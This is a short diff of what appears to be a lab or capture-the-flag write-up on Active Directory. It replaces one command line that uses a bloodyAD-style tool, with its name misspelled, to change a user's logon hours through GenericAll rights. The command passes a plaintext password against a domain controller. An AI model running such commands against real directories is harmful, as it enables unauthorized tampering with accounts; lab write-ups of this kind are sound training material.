@@ -605,5 +605,5 @@ Interesting error
 But with GenericAll over `oscar.m` i should be able to change the logon hours as `bogdan.r`
 
 ```python
-odyAD --host 192.168.100.3 -d bloody.local -u Administrator -p 'Password123!' set object john logonhours -v '////////////////////////////' --b64
+blodyAD --host sg-dc01.shadowgate.local -d shadowgate.local -u bogdan.r -p 'Password123!' set object oscar.m logonhours -v '////////////////////////////' --b64
 ```
